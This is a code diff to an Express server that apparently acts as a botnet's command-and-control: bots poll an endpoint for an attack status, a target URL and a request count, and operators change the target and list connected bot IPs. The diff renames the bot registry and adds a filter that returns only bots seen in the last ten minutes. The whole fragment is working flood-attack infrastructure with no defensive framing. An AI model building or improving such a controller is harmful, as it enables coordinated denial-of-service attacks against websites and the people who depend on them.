@@ -12,7 +12,7 @@ app.set("trust proxy", true);
 
 let status = false;
 let target = "";
-let activeBots = new Map();
+let connectedBots = new Map();
 let botsResponses = [];
 
 app.post("/requestInfo", (req, res) => {
@@ -27,13 +27,13 @@ app.post("/setServerStatus", (req, res) => {
 });
 
 app.get("/getTargetInfo", (req, res) => {
-  activeBots.set(req.ip, new Date());
+  connectedBots.set(req.ip, new Date());
   res.status(200).send({
     status: status,
     targetUrl: target,
     requestNum: 100,
   });
-  console.log(activeBots);
+  console.log(connectedBots);
 });
 
 app.get("/getServerStatus", (req, res) => {
@@ -53,7 +53,13 @@ app.post("/changeTarget", (req, res) => {
 });
 
 app.get("/getConnectedBots", (req, res) => {
-  res.status(200).send(Array.from(activeBots.keys()));
+  const date = new Date();
+
+  let activeBots = Array.from(connectedBots)
+    .filter((entry) => (date.getTime() - entry[1].getTime()) / 60000 < 10)
+    .map((entry) => entry[0]);
+
+  res.status(200).send(activeBots);
   console.log(activeBots);
 });
 
